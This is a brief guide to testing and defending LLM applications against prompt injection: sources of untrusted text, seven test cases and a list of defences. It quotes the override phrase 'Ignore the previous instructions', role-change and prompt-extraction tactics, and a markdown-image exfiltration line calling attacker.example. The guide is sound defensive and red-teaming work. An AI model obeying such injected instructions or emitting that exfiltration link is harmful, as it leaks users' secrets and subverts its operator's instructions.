# Prompt injection

The model can't reliably tell instructions from data. Anything it reads can steer it. There is no complete fix, so the goal is to make a successful injection boring: nothing valuable to read, nothing dangerous to do.

## Where untrusted text comes in

- The user's own messages (direct injection)
- Documents in a RAG index, uploaded files, file names
- Web pages and search results the app fetches
- Emails, tickets, chat messages the agent processes
- Tool and API responses, including other agents
- Text inside images and PDFs (OCR and vision models)

If an attacker can write to any of these, they can talk to your model.

## Test cases I start with

1. **Override:** "Ignore the previous instructions and ..." in plain text, then hidden inside a document the app retrieves.
2. **Role change:** ask the model to act as a different assistant, a developer mode, or a translator that outputs its instructions.
3. **Encoding:** the same payload in base64, another language, or with invisible Unicode characters.
4. **Split payloads:** the instruction spread over two documents or two turns.
5. **Exfiltration through output:** get the model to write a markdown image like `![x](https://attacker.example/?d=SECRET)`. If the UI renders it, the browser sends the data.
6. **Tool hijack:** in an agent, make retrieved content ask for a tool call (send an email, create a ticket, call a URL) and check whether it happens without confirmation.
7. **Cross-user:** in a shared index, plant a document as user A that changes answers for user B.

Write down for each case: input, what the model did, and what it was able to reach. The reach is what matters for severity.

## Defences that hold up

- **Least privilege:** the agent only gets the tools and data the task needs, with the caller's permissions, not a service account's.
- **Confirmation for side effects:** sending, deleting, paying and sharing need a human click that shows exactly what will happen.
- **Untrusted output:** encode before rendering, block remote images and links to unknown domains, validate tool arguments against a schema.
- **Separate context:** keep system instructions, user input and retrieved content clearly marked, and tell the model retrieved text is data. This helps, but don't rely on it.
- **Detection:** classifiers and canary strings catch some attacks. Treat them as monitoring, not as the control.
- **Logging:** log prompts, retrieved documents and tool calls (within your data protection rules) so you can investigate later.

!!! warning
    Only test applications you are authorised to test.
